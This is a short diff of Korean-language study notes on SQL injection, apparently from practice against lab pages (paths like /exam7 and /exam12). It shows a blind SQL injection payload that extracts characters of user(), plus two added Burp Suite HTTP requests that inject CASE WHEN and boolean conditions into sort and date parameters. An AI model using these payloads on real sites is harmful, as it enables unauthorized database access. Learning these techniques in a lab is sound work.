@@ -71,3 +71,8 @@ sas%' and ascii(substring(user(),1,1))>104  and '%1%'='%1 -> i
 
 ##blind sql 과정 finish
 
+
+##burpsuite를 통한 패킷 인젝션
+GET /exam7/notice.php?pageIndex=1&board_id=&sorting=title&sotingAd=DESC,case+when+1=1+then+1+else+(select+1+union+select+2)+end&startDt=&endDt=&searchType=all&keyword= HTTP/1.1
+GET /exam12/notice.php?pageIndex=1&board_id=&sorting=&sotingAd=DESC&startDt=20231001&endDt=20231031+and+user()user()+and+1=1 &searchType=all&keyword= HTTP/1.1
+
